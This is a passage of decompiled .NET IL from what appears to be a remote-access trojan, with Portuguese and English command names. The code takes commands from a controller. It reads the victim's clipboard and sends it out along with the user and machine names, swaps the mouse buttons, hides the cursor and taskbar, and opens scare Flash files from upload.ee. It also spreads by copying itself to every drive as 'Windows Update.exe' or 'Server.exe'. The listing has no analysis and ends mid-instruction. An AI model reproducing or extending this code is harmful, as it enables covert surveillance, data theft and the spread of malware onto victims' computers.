      IL_053c:  ldloc.s    V_138
      IL_053e:  brfalse.s  IL_0546

      IL_0540:  nop
      IL_0541:  ldc.i4.0
      IL_0542:  stloc.s    V_24
      IL_0544:  br.s       IL_059b

      IL_0546:  nop
      IL_0547:  ldloc.s    V_115
      IL_0549:  ldstr      "4"
      IL_054e:  ldc.i4.0
      IL_054f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0554:  ldc.i4.0
      IL_0555:  ceq
      IL_0557:  stloc.s    V_138
      IL_0559:  ldloc.s    V_138
      IL_055b:  brfalse.s  IL_0563

      IL_055d:  nop
      IL_055e:  ldc.i4.1
      IL_055f:  stloc.s    V_24
      IL_0561:  br.s       IL_059b

      IL_0563:  nop
      IL_0564:  ldloc.s    V_115
      IL_0566:  ldstr      "5"
      IL_056b:  ldc.i4.0
      IL_056c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0571:  ldc.i4.0
      IL_0572:  ceq
      IL_0574:  stloc.s    V_138
      IL_0576:  ldloc.s    V_138
      IL_0578:  brfalse.s  IL_0580

      IL_057a:  nop
      IL_057b:  ldc.i4.5
      IL_057c:  stloc.s    V_24
      IL_057e:  br.s       IL_059b

      IL_0580:  nop
      IL_0581:  ldloc.s    V_115
      IL_0583:  ldstr      "6"
      IL_0588:  ldc.i4.0
      IL_0589:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_058e:  ldc.i4.0
      IL_058f:  ceq
      IL_0591:  stloc.s    V_138
      IL_0593:  ldloc.s    V_138
      IL_0595:  brfalse.s  IL_059b

      IL_0597:  nop
      IL_0598:  ldc.i4.2
      IL_0599:  stloc.s    V_24
      IL_059b:  nop
      IL_059c:  ldloc.0
      IL_059d:  ldc.i4.4
      IL_059e:  ldelem.ref
      IL_059f:  ldloc.0
      IL_05a0:  ldc.i4.3
      IL_05a1:  ldelem.ref
      IL_05a2:  ldloc.s    V_24
      IL_05a4:  ldloc.s    V_25
      IL_05a6:  call       valuetype [System.Windows.Forms]System.Windows.Forms.DialogResult [System.Windows.Forms]System.Windows.Forms.MessageBox::Show(string,
                                                                                                                                                         string,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxButtons,
                                                                                                                                                         valuetype [System.Windows.Forms]System.Windows.Forms.MessageBoxIcon)
      IL_05ab:  pop
      IL_05ac:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_05b1:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_05b6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_05bb:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
      IL_05c0:  stloc.s    V_26
      IL_05c2:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
      IL_05c7:  stloc.s    V_23
      IL_05c9:  ldloc.s    V_23
      IL_05cb:  stloc.s    V_117
      IL_05cd:  ldc.i4.0
      IL_05ce:  stloc.s    V_116
      IL_05d0:  br.s       IL_061e

      IL_05d2:  ldloc.s    V_117
      IL_05d4:  ldloc.s    V_116
      IL_05d6:  ldelem.ref
      IL_05d7:  stloc.s    V_26
      IL_05d9:  nop
      .try
      {
        IL_05da:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_05df:  ldloc.s    V_26
        IL_05e1:  ldloc.0
        IL_05e2:  ldc.i4.1
        IL_05e3:  ldelem.ref
        IL_05e4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_05e9:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string)
        IL_05ee:  nop
        IL_05ef:  ldloc.s    V_26
        IL_05f1:  ldloc.0
        IL_05f2:  ldc.i4.1
        IL_05f3:  ldelem.ref
        IL_05f4:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_05f9:  ldc.i4     0x80
        IL_05fe:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                          valuetype [mscorlib]System.IO.FileAttributes)
        IL_0603:  nop
        IL_0604:  leave.s    IL_0616

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0606:  dup
        IL_0607:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_060c:  stloc.s    V_27
        IL_060e:  nop
        IL_060f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0614:  leave.s    IL_0616

      }  // end handler
      IL_0616:  nop
      IL_0617:  ldloc.s    V_116
      IL_0619:  ldc.i4.1
      IL_061a:  add.ovf
      IL_061b:  stloc.s    V_116
      IL_061d:  nop
      IL_061e:  ldloc.s    V_116
      IL_0620:  ldloc.s    V_117
      IL_0622:  ldlen
      IL_0623:  conv.ovf.i4
      IL_0624:  clt
      IL_0626:  stloc.s    V_138
      IL_0628:  ldloc.s    V_138
      IL_062a:  brtrue.s   IL_05d2

      IL_062c:  br         IL_17d9

      IL_0631:  nop
      IL_0632:  ldloc.s    V_107
      IL_0634:  ldstr      "NormalMouse"
      IL_0639:  ldc.i4.0
      IL_063a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_063f:  ldc.i4.0
      IL_0640:  ceq
      IL_0642:  stloc.s    V_138
      IL_0644:  ldloc.s    V_138
      IL_0646:  brfalse.s  IL_0656

      IL_0648:  nop
      IL_0649:  ldc.i4.0
      IL_064a:  conv.i8
      IL_064b:  call       int64 j.OK::SwapMouseButton(int64)
      IL_0650:  pop
      IL_0651:  br         IL_17d9

      IL_0656:  nop
      IL_0657:  ldloc.s    V_107
      IL_0659:  ldstr      "ReverseMouse"
      IL_065e:  ldc.i4.0
      IL_065f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0664:  ldc.i4.0
      IL_0665:  ceq
      IL_0667:  stloc.s    V_138
      IL_0669:  ldloc.s    V_138
      IL_066b:  brfalse.s  IL_067f

      IL_066d:  nop
      IL_066e:  ldc.i4     0x100
      IL_0673:  conv.i8
      IL_0674:  call       int64 j.OK::SwapMouseButton(int64)
      IL_0679:  pop
      IL_067a:  br         IL_17d9

      IL_067f:  nop
      IL_0680:  ldloc.s    V_107
      IL_0682:  ldstr      "SoundON"
      IL_0687:  ldc.i4.0
      IL_0688:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_068d:  ldc.i4.0
      IL_068e:  ceq
      IL_0690:  stloc.s    V_138
      IL_0692:  ldloc.s    V_138
      IL_0694:  brfalse.s  IL_06c5

      IL_0696:  nop
      IL_0697:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_069c:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_06a1:  ldc.i4     0x319
      IL_06a6:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_06ab:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_06b0:  ldc.i4     0x80000
      IL_06b5:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_06ba:  call       native int j.OK::SendMessageW(native int,
                                                         int32,
                                                         native int,
                                                         native int)
      IL_06bf:  pop
      IL_06c0:  br         IL_17d9

      IL_06c5:  nop
      IL_06c6:  ldloc.s    V_107
      IL_06c8:  ldstr      "SoundOFF"
      IL_06cd:  ldc.i4.0
      IL_06ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_06d3:  ldc.i4.0
      IL_06d4:  ceq
      IL_06d6:  stloc.s    V_138
      IL_06d8:  ldloc.s    V_138
      IL_06da:  brfalse.s  IL_070b

      IL_06dc:  nop
      IL_06dd:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_06e2:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_06e7:  ldc.i4     0x319
      IL_06ec:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_06f1:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_06f6:  ldc.i4     0x80000
      IL_06fb:  call       native int [mscorlib]System.IntPtr::op_Explicit(int32)
      IL_0700:  call       native int j.OK::SendMessageW(native int,
                                                         int32,
                                                         native int,
                                                         native int)
      IL_0705:  pop
      IL_0706:  br         IL_17d9

      IL_070b:  nop
      IL_070c:  ldloc.s    V_107
      IL_070e:  ldstr      "sendfileimge"
      IL_0713:  ldc.i4.0
      IL_0714:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0719:  ldc.i4.0
      IL_071a:  ceq
      IL_071c:  stloc.s    V_138
      IL_071e:  ldloc.s    V_138
      IL_0720:  brfalse.s  IL_0759

      IL_0722:  nop
      IL_0723:  call       string [mscorlib]System.IO.Path::GetTempPath()
      IL_0728:  ldloc.0
      IL_0729:  ldc.i4.1
      IL_072a:  ldelem.ref
      IL_072b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0730:  ldloc.0
      IL_0731:  ldc.i4.2
      IL_0732:  ldelem.ref
      IL_0733:  call       uint8[] [mscorlib]System.Convert::FromBase64String(string)
      IL_0738:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                        uint8[])
      IL_073d:  nop
      IL_073e:  ldc.i4     0x3e8
      IL_0743:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0748:  nop
      IL_0749:  ldstr      "Coloreg"
      IL_074e:  call       bool j.OK::Send(string)
      IL_0753:  pop
      IL_0754:  br         IL_17d9

      IL_0759:  nop
      IL_075a:  ldloc.s    V_107
      IL_075c:  ldstr      "oada1"
      IL_0761:  ldc.i4.0
      IL_0762:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0767:  ldc.i4.0
      IL_0768:  ceq
      IL_076a:  stloc.s    V_138
      IL_076c:  ldloc.s    V_138
      IL_076e:  brfalse.s  IL_0781

      IL_0770:  nop
      IL_0771:  ldstr      "www.upload.ee/image/2298158/koli.swf"
      IL_0776:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_077b:  pop
      IL_077c:  br         IL_17d9

      IL_0781:  nop
      IL_0782:  ldloc.s    V_107
      IL_0784:  ldstr      "oada2"
      IL_0789:  ldc.i4.0
      IL_078a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_078f:  ldc.i4.0
      IL_0790:  ceq
      IL_0792:  stloc.s    V_138
      IL_0794:  ldloc.s    V_138
      IL_0796:  brfalse.s  IL_07a9

      IL_0798:  nop
      IL_0799:  ldstr      "www.upload.ee/image/2971847/scare4.swf"
      IL_079e:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_07a3:  pop
      IL_07a4:  br         IL_17d9

      IL_07a9:  nop
      IL_07aa:  ldloc.s    V_107
      IL_07ac:  ldstr      "oada3"
      IL_07b1:  ldc.i4.0
      IL_07b2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07b7:  ldc.i4.0
      IL_07b8:  ceq
      IL_07ba:  stloc.s    V_138
      IL_07bc:  ldloc.s    V_138
      IL_07be:  brfalse.s  IL_07d1

      IL_07c0:  nop
      IL_07c1:  ldstr      "www.upload.ee/image/2299952/facey.swf"
      IL_07c6:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_07cb:  pop
      IL_07cc:  br         IL_17d9

      IL_07d1:  nop
      IL_07d2:  ldloc.s    V_107
      IL_07d4:  ldstr      "ClearClp"
      IL_07d9:  ldc.i4.0
      IL_07da:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_07df:  ldc.i4.0
      IL_07e0:  ceq
      IL_07e2:  stloc.s    V_138
      IL_07e4:  ldloc.s    V_138
      IL_07e6:  brfalse.s  IL_07fe

      IL_07e8:  nop
      IL_07e9:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_07ee:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Clipboard()
      IL_07f3:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy::Clear()
      IL_07f8:  nop
      IL_07f9:  br         IL_17d9

      IL_07fe:  nop
      IL_07ff:  ldloc.s    V_107
      IL_0801:  ldstr      "SetClp"
      IL_0806:  ldc.i4.0
      IL_0807:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_080c:  ldc.i4.0
      IL_080d:  ceq
      IL_080f:  stloc.s    V_138
      IL_0811:  ldloc.s    V_138
      IL_0813:  brfalse.s  IL_082e

      IL_0815:  nop
      IL_0816:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_081b:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Clipboard()
      IL_0820:  ldloc.0
      IL_0821:  ldc.i4.1
      IL_0822:  ldelem.ref
      IL_0823:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy::SetText(string)
      IL_0828:  nop
      IL_0829:  br         IL_17d9

      IL_082e:  nop
      IL_082f:  ldloc.s    V_107
      IL_0831:  ldstr      "CursorShow"
      IL_0836:  ldc.i4.0
      IL_0837:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_083c:  ldc.i4.0
      IL_083d:  ceq
      IL_083f:  stloc.s    V_138
      IL_0841:  ldloc.s    V_138
      IL_0843:  brfalse.s  IL_0851

      IL_0845:  nop
      IL_0846:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::Show()
      IL_084b:  nop
      IL_084c:  br         IL_17d9

      IL_0851:  nop
      IL_0852:  ldloc.s    V_107
      IL_0854:  ldstr      "CursorHide"
      IL_0859:  ldc.i4.0
      IL_085a:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_085f:  ldc.i4.0
      IL_0860:  ceq
      IL_0862:  stloc.s    V_138
      IL_0864:  ldloc.s    V_138
      IL_0866:  brfalse.s  IL_0874

      IL_0868:  nop
      IL_0869:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::Hide()
      IL_086e:  nop
      IL_086f:  br         IL_17d9

      IL_0874:  nop
      IL_0875:  ldloc.s    V_107
      IL_0877:  ldstr      "EnviarServidorChamaFormClipboard"
      IL_087c:  ldc.i4.0
      IL_087d:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0882:  ldc.i4.0
      IL_0883:  ceq
      IL_0885:  stloc.s    V_138
      IL_0887:  ldloc.s    V_138
      IL_0889:  brfalse.s  IL_08e2

      IL_088b:  nop
      IL_088c:  ldc.i4.6
      IL_088d:  newarr     [mscorlib]System.String
      IL_0892:  stloc.s    V_108
      IL_0894:  ldloc.s    V_108
      IL_0896:  ldc.i4.0
      IL_0897:  ldstr      "FormClipboard"
      IL_089c:  stelem.ref
      IL_089d:  nop
      IL_089e:  ldloc.s    V_108
      IL_08a0:  ldc.i4.1
      IL_08a1:  ldsfld     string j.OK::Y
      IL_08a6:  stelem.ref
      IL_08a7:  nop
      IL_08a8:  ldloc.s    V_108
      IL_08aa:  ldc.i4.2
      IL_08ab:  call       string [mscorlib]System.Environment::get_UserName()
      IL_08b0:  stelem.ref
      IL_08b1:  nop
      IL_08b2:  ldloc.s    V_108
      IL_08b4:  ldc.i4.3
      IL_08b5:  ldstr      "/"
      IL_08ba:  stelem.ref
      IL_08bb:  nop
      IL_08bc:  ldloc.s    V_108
      IL_08be:  ldc.i4.4
      IL_08bf:  call       string [mscorlib]System.Environment::get_MachineName()
      IL_08c4:  stelem.ref
      IL_08c5:  nop
      IL_08c6:  ldloc.s    V_108
      IL_08c8:  ldc.i4.5
      IL_08c9:  ldsfld     string j.OK::Y
      IL_08ce:  stelem.ref
      IL_08cf:  nop
      IL_08d0:  ldloc.s    V_108
      IL_08d2:  call       string [mscorlib]System.String::Concat(string[])
      IL_08d7:  call       bool j.OK::Send(string)
      IL_08dc:  pop
      IL_08dd:  br         IL_17d9

      IL_08e2:  nop
      IL_08e3:  ldloc.s    V_107
      IL_08e5:  ldstr      "MeuTextoClipboard"
      IL_08ea:  ldc.i4.0
      IL_08eb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_08f0:  ldc.i4.0
      IL_08f1:  ceq
      IL_08f3:  stloc.s    V_138
      IL_08f5:  ldloc.s    V_138
      IL_08f7:  brfalse.s  IL_092d

      IL_08f9:  nop
      IL_08fa:  ldstr      "TextoClipboard"
      IL_08ff:  ldsfld     string j.OK::Y
      IL_0904:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0909:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Clipboard()
      IL_090e:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy::GetText()
      IL_0913:  callvirt   instance string [mscorlib]System.String::ToString()
      IL_0918:  ldsfld     string j.OK::Y
      IL_091d:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_0922:  call       bool j.OK::Send(string)
      IL_0927:  pop
      IL_0928:  br         IL_17d9

      IL_092d:  nop
      IL_092e:  ldloc.s    V_107
      IL_0930:  ldstr      "NovoClipboard"
      IL_0935:  ldc.i4.0
      IL_0936:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_093b:  ldc.i4.0
      IL_093c:  ceq
      IL_093e:  stloc.s    V_138
      IL_0940:  ldloc.s    V_138
      IL_0942:  brfalse.s  IL_0953

      IL_0944:  nop
      IL_0945:  ldloc.0
      IL_0946:  ldc.i4.1
      IL_0947:  ldelem.ref
      IL_0948:  call       void [System.Windows.Forms]System.Windows.Forms.Clipboard::SetText(string)
      IL_094d:  nop
      IL_094e:  br         IL_17d9

      IL_0953:  nop
      IL_0954:  ldloc.s    V_107
      IL_0956:  ldstr      "ExcluirClipboard"
      IL_095b:  ldc.i4.0
      IL_095c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0961:  ldc.i4.0
      IL_0962:  ceq
      IL_0964:  stloc.s    V_138
      IL_0966:  ldloc.s    V_138
      IL_0968:  brfalse.s  IL_0976

      IL_096a:  nop
      IL_096b:  call       void [System.Windows.Forms]System.Windows.Forms.Clipboard::Clear()
      IL_0970:  nop
      IL_0971:  br         IL_17d9

      IL_0976:  nop
      IL_0977:  ldloc.s    V_107
      IL_0979:  ldstr      "spreading"
      IL_097e:  ldc.i4.0
      IL_097f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0984:  ldc.i4.0
      IL_0985:  ceq
      IL_0987:  stloc.s    V_138
      IL_0989:  ldloc.s    V_138
      IL_098b:  brfalse    IL_0a57

      IL_0990:  nop
      IL_0991:  nop
      .try
      {
        IL_0992:  call       class [mscorlib]System.IO.DriveInfo[] [mscorlib]System.IO.DriveInfo::GetDrives()
        IL_0997:  stloc.s    V_28
        IL_0999:  ldloc.s    V_28
        IL_099b:  stloc.s    V_119
        IL_099d:  ldc.i4.0
        IL_099e:  stloc.s    V_118
        IL_09a0:  br         IL_0a2e

        IL_09a5:  ldloc.s    V_119
        IL_09a7:  ldloc.s    V_118
        IL_09a9:  ldelem.ref
        IL_09aa:  stloc.s    V_29
        IL_09ac:  call       void [System.Windows.Forms]System.Windows.Forms.Application::DoEvents()
        IL_09b1:  nop
        IL_09b2:  ldc.i4.s   10
        IL_09b4:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_09b9:  nop
        IL_09ba:  ldloc.s    V_29
        IL_09bc:  callvirt   instance bool [mscorlib]System.IO.DriveInfo::get_IsReady()
        IL_09c1:  stloc.s    V_138
        IL_09c3:  ldloc.s    V_138
        IL_09c5:  brfalse.s  IL_0a26

        IL_09c7:  call       object j.OK::get_NomeSpreadDiscoLocal()
        IL_09cc:  ldnull
        IL_09cd:  ldc.i4.0
        IL_09ce:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectEqual(object,
                                                                                                                                         object,
                                                                                                                                         bool)
        IL_09d3:  stloc.s    V_137
        IL_09d5:  ldloc.s    V_137
        IL_09d7:  brfalse.s  IL_09fd

        IL_09d9:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_09de:  ldloc.s    V_29
        IL_09e0:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DriveInfo::get_RootDirectory()
        IL_09e5:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_09ea:  ldstr      "Windows Update.exe"
        IL_09ef:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_09f4:  ldc.i4.1
        IL_09f5:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string,
                                                                 bool)
        IL_09fa:  nop
        IL_09fb:  br.s       IL_0a25

        IL_09fd:  nop
        IL_09fe:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_0a03:  ldloc.s    V_29
        IL_0a05:  callvirt   instance class [mscorlib]System.IO.DirectoryInfo [mscorlib]System.IO.DriveInfo::get_RootDirectory()
        IL_0a0a:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0a0f:  call       object j.OK::get_NomeSpreadDiscoLocal()
        IL_0a14:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConcatenateObject(object,
                                                                                                                               object)
        IL_0a19:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
        IL_0a1e:  ldc.i4.1
        IL_0a1f:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string,
                                                                 bool)
        IL_0a24:  nop
        IL_0a25:  nop
        IL_0a26:  nop
        IL_0a27:  ldloc.s    V_118
        IL_0a29:  ldc.i4.1
        IL_0a2a:  add.ovf
        IL_0a2b:  stloc.s    V_118
        IL_0a2d:  nop
        IL_0a2e:  ldloc.s    V_118
        IL_0a30:  ldloc.s    V_119
        IL_0a32:  ldlen
        IL_0a33:  conv.ovf.i4
        IL_0a34:  clt
        IL_0a36:  stloc.s    V_138
        IL_0a38:  ldloc.s    V_138
        IL_0a3a:  brtrue     IL_09a5

        IL_0a3f:  leave.s    IL_0a51

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0a41:  dup
        IL_0a42:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a47:  stloc.s    V_30
        IL_0a49:  nop
        IL_0a4a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a4f:  leave.s    IL_0a51

      }  // end handler
      IL_0a51:  nop
      IL_0a52:  br         IL_17d9

      IL_0a57:  nop
      IL_0a58:  ldloc.s    V_107
      IL_0a5a:  ldstr      "spreading"
      IL_0a5f:  ldc.i4.0
      IL_0a60:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0a65:  ldc.i4.0
      IL_0a66:  ceq
      IL_0a68:  stloc.s    V_138
      IL_0a6a:  ldloc.s    V_138
      IL_0a6c:  brfalse    IL_0afb

      IL_0a71:  nop
      IL_0a72:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0a77:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_FileSystem()
      IL_0a7c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.FileSystemProxy::get_SpecialDirectories()
      IL_0a81:  callvirt   instance string [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.SpecialDirectoriesProxy::get_ProgramFiles()
      IL_0a86:  stloc.s    V_32
      IL_0a88:  call       string[] [mscorlib]System.IO.Directory::GetLogicalDrives()
      IL_0a8d:  stloc.s    V_31
      IL_0a8f:  ldloc.s    V_31
      IL_0a91:  stloc.s    V_121
      IL_0a93:  ldc.i4.0
      IL_0a94:  stloc.s    V_120
      IL_0a96:  br.s       IL_0ae8

      IL_0a98:  ldloc.s    V_121
      IL_0a9a:  ldloc.s    V_120
      IL_0a9c:  ldelem.ref
      IL_0a9d:  stloc.s    V_32
      IL_0a9f:  nop
      .try
      {
        IL_0aa0:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
        IL_0aa5:  ldloc.s    V_32
        IL_0aa7:  ldstr      "Server.exe"
        IL_0aac:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0ab1:  call       void [mscorlib]System.IO.File::Copy(string,
                                                                 string)
        IL_0ab6:  nop
        IL_0ab7:  ldloc.s    V_32
        IL_0ab9:  ldstr      "Server.exe"
        IL_0abe:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0ac3:  ldc.i4     0x80
        IL_0ac8:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                          valuetype [mscorlib]System.IO.FileAttributes)
        IL_0acd:  nop
        IL_0ace:  leave.s    IL_0ae0

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0ad0:  dup
        IL_0ad1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ad6:  stloc.s    V_33
        IL_0ad8:  nop
        IL_0ad9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0ade:  leave.s    IL_0ae0

      }  // end handler
      IL_0ae0:  nop
      IL_0ae1:  ldloc.s    V_120
      IL_0ae3:  ldc.i4.1
      IL_0ae4:  add.ovf
      IL_0ae5:  stloc.s    V_120
      IL_0ae7:  nop
      IL_0ae8:  ldloc.s    V_120
      IL_0aea:  ldloc.s    V_121
      IL_0aec:  ldlen
      IL_0aed:  conv.ovf.i4
      IL_0aee:  clt
      IL_0af0:  stloc.s    V_138
      IL_0af2:  ldloc.s    V_138
      IL_0af4:  brtrue.s   IL_0a98

      IL_0af6:  br         IL_17d9

      IL_0afb:  nop
      IL_0afc:  ldloc.s    V_107
      IL_0afe:  ldstr      "EsconderBarraDeTarefas"
      IL_0b03:  ldc.i4.0
      IL_0b04:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b09:  ldc.i4.0
      IL_0b0a:  ceq
      IL_0b0c:  stloc.s    V_138
      IL_0b0e:  ldloc.s    V_138
      IL_0b10:  brfalse.s  IL_0b43

      IL_0b12:  nop
      IL_0b13:  ldstr      "Shell_traywnd"
      IL_0b18:  stloc.s    V_122
      IL_0b1a:  ldloca.s   V_122
      IL_0b1c:  ldstr      ""
      IL_0b21:  stloc.s    V_123
      IL_0b23:  ldloca.s   V_123
      IL_0b25:  call       int32 j.OK::FindWindow(string&,
                                                  string&)
      IL_0b2a:  stloc.s    V_34
      IL_0b2c:  ldloc.s    V_34
      IL_0b2e:  ldc.i4.0
      IL_0b2f:  ldc.i4.0
      IL_0b30:  ldc.i4.0
